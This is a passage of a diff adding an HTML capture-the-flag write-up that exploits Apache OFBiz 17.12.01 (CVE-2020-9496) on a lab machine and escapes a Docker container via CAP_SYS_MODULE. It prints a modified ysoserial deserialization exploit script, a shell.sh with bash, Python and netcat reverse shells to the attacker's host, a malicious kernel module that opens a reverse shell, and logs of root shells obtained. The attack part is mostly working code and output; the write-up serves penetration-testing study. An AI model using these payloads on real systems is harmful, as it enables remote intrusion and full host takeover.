+Update docker image for production use -</code></pre>
+
+                <p>This note mentions Docker, which will be relevant later.</p>
+
+                <h2>Post-Exploitation Enumeration - Apache OFBiz</h2>
+                <p>I run <code>ss -tuln</code> to see locally open ports and discover port 8443:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+
+                <p>I perform port forwarding with SSH to inspect the service:</p>
+                <pre><code class="language-bash">ssh -L 8443:127.0.0.1:8443 marcus@10.10.10.238</code></pre>
+
+                <p>Accessing <code>https://localhost:8443</code>, I discover Apache OFBiz running:</p>
+                <p><img src="./media/image5.png" alt="Apache OFBiz web interface showing the service's main page" /></p>
+
+                <p>The site suggests default credentials <code>admin:ofbiz</code>, but they don't work in the login: <code>https://localhost:8443/webtools/control/login</code></p>
+
+                <p>In the footer, I identify the exact version:</p>
+                <pre><code class="language-plaintext">Powered by Apache OFBiz. Release 17.12.01</code></pre>
+
+                <h3>CVE-2020-9496 - Insecure Deserialization</h3>
+                <p>I investigate vulnerabilities for this version and find CVE-2020-9496, an insecure deserialization vulnerability in the XML-RPC endpoint: <a href="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2020-9496">https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2020-9496</a></p>
+
+                <blockquote>
+                    <p>"The XML-RPC request is vulnerable to insecure deserialization and Cross-Site Scripting issues in Apache OFBiz version 17.12.03"</p>
+                </blockquote>
+
+                <p>I find exploits for this CVE:</p>
+                <ul>
+                    <li><a href="https://www.exploit-db.com/exploits/50178">https://www.exploit-db.com/exploits/50178</a></li>
+                    <li><a href="https://github.com/g33xter/CVE-2020-9496">https://github.com/g33xter/CVE-2020-9496</a></li>
+                </ul>
+
+                <p>The exploit-db exploit has a broken link to the ysoserial JAR file, so I download it directly from the original repository: <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+
+                <p>I also install Java 11 on my machine to be able to compile the payloads.</p>
+
+                <h3>Exploit Modification</h3>
+                <p>The original exploit doesn't work correctly, so I modify it to use Java 11 specifically and change the reverse shell payload. The modified main function is:</p>
+                <pre><code class="language-bash">function webRequest(){
+    echo -e "[*] Generating a JAR payload\n"
+    payload=$(/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsBeanutils1 "wget $ip/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n")
+    
+    echo -e "[*] Sending malicious shell to server...\n" && sleep 3
+    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload</serializable></value></member></struct></value></param></params></methodCall>" -k -H 'Content-Type:application/xml' &>/dev/null
+    
+    echo -e "[*] Generating a second JAR payload"
+    payload2=$(/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n")
+    
+    echo -e "\n[*] Executing the payload in the server...\n" && sleep 3
+    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>$payload2</serializable></value></member></struct></value></param></params></methodCall>" -k -H 'Content-Type:application/xml' &>/dev/null
+    
+    echo -e "\n[*]Deleting Files..."
+}</code></pre>
+
+                <p>I create a <code>shell.sh</code> file with multiple reverse shell methods for better compatibility:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+export RHOST="10.10.16.3"
+export RPORT="443"
+
+bash -c "bash -i >& /dev/tcp/\$RHOST/\$RPORT 0>&1" 2>/dev/null || \
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$RHOST",$RPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])' 2>/dev/null || \
+nc -e /bin/sh $RHOST $RPORT 2>/dev/null</code></pre>
+
+                <h3>Exploit Execution</h3>
+                <p>The attack works in two phases:</p>
+                <ol>
+                    <li><strong>First phase:</strong> Compiles a ysoserial payload with <code>CommonsBeanutils1</code> that executes a <code>wget</code> to download <code>shell.sh</code> from my machine and save it to <code>/tmp/shell.sh</code></li>
+                    <li><strong>Second phase:</strong> Compiles another payload that executes <code>bash /tmp/shell.sh</code>, triggering the reverse shell</li>
+                </ol>
+
+                <p>I prepare the environment for the attack:</p>
+                <pre><code class="language-bash"># Serve shell.sh via HTTP
+python3 -m http.server 80</code></pre>
+
+                <pre><code class="language-bash"># Listener for the reverse shell
+sudo nc -lvnp 443</code></pre>
+
+                <p>I execute the modified exploit:</p>
+                <pre><code class="language-bash">bash ofbiz_pwn.sh -i http://10.10.16.3 -p 443</code></pre>
+
+                <p>My HTTP server receives the request:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.238 - - "GET /shell.sh HTTP/1.1" 200 -</code></pre>
+
+                <p>And I receive the reverse shell as root:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.238] 60224
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@067381cad370:/usr/src/apache-ofbiz-17.12.01# whoami
+root</code></pre>
+
+                <p>However, I quickly notice that I'm inside a Docker container, not on the host machine. The hostname <code>067381cad370</code> and the system structure confirm it.</p>
+
+                <h2>Container Escape - CAP_SYS_MODULE</h2>
+                <p>After confirming I'm in a container, I investigate methods to escape to the host system. The first step is to check the container's capabilities:</p>
+                <pre><code class="language-bash">capsh --print</code></pre>
+
+                <p>The output reveals a critical capability:</p>
+                <pre><code class="language-plaintext">Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap</code></pre>
+
+                <p>The <code>CAP_SYS_MODULE</code> capability is enabled, which allows loading kernel modules. This is extremely dangerous since kernel modules run with maximum privileges on the host, not in the container.</p>
+
+                <h3>Malicious Kernel Module</h3>
+                <p>I find a detailed guide for escaping the container via this capability: <a href="https://blog.nody.cc/posts/container-breakouts-part2/#cap_sys_module--load-kernel-module">https://blog.nody.cc/posts/container-breakouts-part2/#cap_sys_module--load-kernel-module</a></p>
+
+                <p>I create a kernel module in C that will execute a reverse shell in the host's context. The module code (<code>reverse-shell.c</code>) is:</p>
+                <pre><code class="language-c">#include <linux/kmod.h>
+#include <linux/module.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.16.3/443 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);</code></pre>
+
+                <p>This module uses <code>call_usermodehelper()</code> to execute commands in the host's userspace when the module is loaded.</p>
+
+                <h3>Module Compilation</h3>
+                <p>To compile the module, I need the host's kernel headers. I verify the kernel version:</p>
+                <pre><code class="language-bash">uname -r</code></pre>
+
+                <pre><code class="language-plaintext">4.15.0-151-generic</code></pre>
+
+                <p>I create a Makefile adapted to my environment:</p>
+                <pre><code class="language-makefile">obj-m +=reverse-shell.o
+
+all:
+	make -C /lib/modules/4.15.0-142-generic/build M=/root modules
+
+clean:
+	make -C /lib/modules/4.15.0-142-generic/build M=/root clean</code></pre>
+
+                <p>I compile the kernel module:</p>
+                <pre><code class="language-bash">make</code></pre>
+
+                <p>The compilation generates several files, with the most important being <code>reverse-shell.ko</code>, which is the compiled kernel module:</p>
+                <pre><code class="language-plaintext">make -C /lib/modules/4.15.0-142-generic/build M=/root modules
+make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
+  CC [M]  /root/reverse-shell.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /root/reverse-shell.mod.o
+  LD [M]  /root/reverse-shell.ko
+make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'</code></pre>
+
+                <h3>Final Container Escape</h3>
+                <p>I prepare a new netcat listener on my attacking machine:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>I load the malicious module with <code>insmod</code>:</p>
+                <pre><code class="language-bash">insmod reverse-shell.ko</code></pre>
+
+                <p>When loading the module, it executes in the context of the host's kernel, not the container, so the reverse shell originates from the real host system:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.3] from (UNKNOWN) [10.10.10.238] 32782
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@monitors:/# whoami
+root
+root@monitors:/# hostname
+monitors</code></pre>
+
+                <p>I have successfully escaped from the container and now have root access on the real host machine! I can verify I'm no longer in the container by observing the hostname <code>monitors</code> instead of the previous container ID.</p>
+
+                <p>Finally, I obtain the root flag:</p>
+                <pre><code class="language-bash">cat /root/root.txt</code></pre>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
